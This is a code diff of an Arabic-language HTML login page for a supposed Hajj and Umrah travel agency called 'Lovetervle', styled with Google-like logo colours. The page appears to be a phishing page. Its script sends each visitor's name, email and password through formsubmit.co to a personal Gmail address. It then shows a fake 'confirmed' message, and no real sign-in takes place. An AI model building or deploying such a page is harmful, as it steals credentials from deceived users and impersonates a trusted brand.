@@ -6,47 +6,39 @@
 <title>Lovetervle</title>
 <style>
   *{margin:0;padding:0;box-sizing:border-box;font-family:tahoma, sans-serif;}
-  body{background:#1a73e8; min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px;}
-  .card{background:white; width:100%; max-width:420px; border-radius:24px; padding:35px 25px; box-shadow:0 10px 30px rgba(0,0,0,0.2); text-align:center;}
-  .google-logo{font-size:38px; font-weight:900; letter-spacing:-1px; margin-bottom:8px;}
+  body{background:#f2f2f2; min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px;}
+  .card{background:white; width:100%; max-width:400px; border-radius:16px; padding:30px 25px; box-shadow:0 2px 15px rgba(0,0,0,0.08); border:1px solid #eee;}
+  .logo{text-align:center; margin-bottom:20px;}
+  .google-logo{font-size:36px; font-weight:900; letter-spacing:-1px;}
   .g-blue{color:#4285F4;} .g-red{color:#EA4335;} .g-yellow{color:#FBBC05;} .g-green{color:#34A853;}
-  .sub{color:#666; font-size:14px; margin-bottom:25px;}
-  .input-group{margin-bottom:14px; text-align:right;}
-  .input-group input{width:100%; padding:14px 15px; border:1px solid #ddd; border-radius:12px; outline:none; font-size:15px;}
-  .btn{width:100%; padding:14px; background:#4285F4; color:white; border:none; border-radius:12px; font-weight:bold; cursor:pointer; font-size:16px; margin-top:5px;}
+  .sub{color:#777; font-size:13px; margin-top:6px; text-align:center;}
+  .input-group{margin-bottom:12px;}
+  .input-group input{width:100%; padding:13px 15px; border:1px solid #ddd; border-radius:10px; outline:none; background:#fafafa;}
+  .input-group input:focus{border-color:#4285F4; background:white;}
+  .btn{width:100%; padding:13px; background:#4285F4; color:white; border:none; border-radius:10px; font-weight:bold; cursor:pointer;}
   
-  /* شكل التأكيد الجديد */
-  .success-box{display:none;}
-  .check-icon{font-size:60px; margin-bottom:15px;}
-  .success-title{font-size:22px; font-weight:bold; color:#155724; background:#d4edda; padding:18px; border-radius:14px; border:1px solid #c3e6cb;}
-  .footer{margin-top:25px; font-size:14px; border-top:1px solid #eee; padding-top:15px; font-weight:900;}
-
-  #formContent{display:block;}
+  /* رسالة التأكيد جوه الفورم */
+  .success-inline{display:none; background:#d4edda; color:#155724; border:1px solid #c3e6cb; padding:14px; border-radius:10px; text-align:center; font-weight:bold; margin-top:15px;}
+  
+  .footer{text-align:center; margin-top:20px; font-size:13px; border-top:1px solid #eee; padding-top:14px; font-weight:900;}
 </style>
 </head>
 <body>
 <div class="card">
-  <div id="formContent">
+  <div class="logo">
     <div class="google-logo">
       ✈️ <span class="g-blue">L</span><span class="g-red">o</span><span class="g-yellow">v</span><span class="g-blue">e</span><span class="g-green">t</span><span class="g-red">e</span><span class="g-yellow">r</span><span class="g-blue">v</span><span class="g-green">l</span><span class="g-red">e</span>
     </div>
     <div class="sub">وكالة السفر الأولى للحج والعمرة</div>
-    
-    <form id="myForm" style="text-align:right;">
-      <div class="input-group"><input type="text" name="الاسم" placeholder="الاسم الكامل" required></div>
-      <div class="input-group"><input type="email" name="الايميل" placeholder="البريد الإلكتروني" required></div>
-      <div class="input-group"><input type="password" name="كلمة المرور" placeholder="كلمة المرور" required></div>
-      <button type="submit" class="btn" id="btn">تسجيل الدخول</button>
-    </form>
   </div>
 
-  <div id="successBox" class="success-box">
-    <div class="google-logo" style="font-size:32px;">
-      ✈️ <span class="g-blue">L</span><span class="g-red">o</span><span class="g-yellow">v</span><span class="g-blue">e</span><span class="g-green">t</span><span class="g-red">e</span><span class="g-yellow">r</span><span class="g-blue">v</span><span class="g-green">l</span><span class="g-red">e</span>
-    </div>
-    <div class="sub">وكالة السفر الأولى للحج والعمرة</div>
-    <div class="success-title">✅ تم التأكيد</div>
-  </div>
+  <form id="myForm">
+    <div class="input-group"><input type="text" name="الاسم" placeholder="الاسم الكامل" required></div>
+    <div class="input-group"><input type="email" name="الايميل" placeholder="البريد الإلكتروني" required></div>
+    <div class="input-group"><input type="password" name="كلمة المرور" placeholder="كلمة المرور" required></div>
+    <button type="submit" class="btn" id="btn">تسجيل الدخول</button>
+    <div class="success-inline" id="success">✅ تم التأكيد</div>
+  </form>
 
   <div class="footer">
     © <span class="g-blue">l</span><span class="g-red">o</span><span class="g-yellow">v</span><span class="g-blue">e</span> <span class="g-green">t</span><span class="g-red">r</span><span class="g-yellow">a</span><span class="g-blue">v</span><span class="g-green">e</span><span class="g-blue">l</span><span class="g-red">s</span> 2026
@@ -56,24 +48,24 @@
 <script>
 const form = document.getElementById('myForm');
 const btn = document.getElementById('btn');
-const formContent = document.getElementById('formContent');
-const successBox = document.getElementById('successBox');
+const success = document.getElementById('success');
 
 form.addEventListener('submit', e => {
   e.preventDefault();
   btn.innerText = "جاري الإرسال...";
   btn.disabled = true;
-  
+
   const data = new FormData(form);
-  
+
   fetch("https://formsubmit.co/ajax/mosabshareef2222@gmail.com", {
     method: "POST",
     body: data
   })
   .then(res => res.json())
   .then(() => {
-    formContent.style.display = "none";
-    successBox.style.display = "block";
+    success.style.display = "block";
+    btn.innerText = "تم الإرسال";
+    form.reset();
   })
   .catch(() => {
     alert("حصل خطأ");
